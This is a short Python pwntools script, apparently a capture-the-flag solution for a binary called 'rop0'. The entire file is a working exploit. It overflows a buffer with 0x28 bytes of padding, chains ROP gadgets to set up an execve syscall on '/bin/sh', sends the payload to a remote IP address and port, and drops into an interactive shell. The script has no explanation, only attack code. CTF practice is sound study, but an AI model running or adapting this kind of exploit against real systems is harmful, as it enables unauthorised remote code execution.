from pwn import *

context.arch = 'amd64'

bin_sh = 0x6ccd60
pop_radbx_ret = 0x478616
pop_rdi_ret = 0x401516
syscall = 0x4672b5
pop_rsi_ret = 0x401637
payload = flat(['A'*0x28, pop_rsi_ret, 0, pop_radbx_ret, 0x3b, 0, 0, pop_rdi_ret, bin_sh, syscall])


#r = process('./rop0')
r = remote('140.110.112.31', 3121)
r.sendline('/bin/sh\x00')
print r.recvline()
r.send(payload)
print r.recvline()
r.interactive()
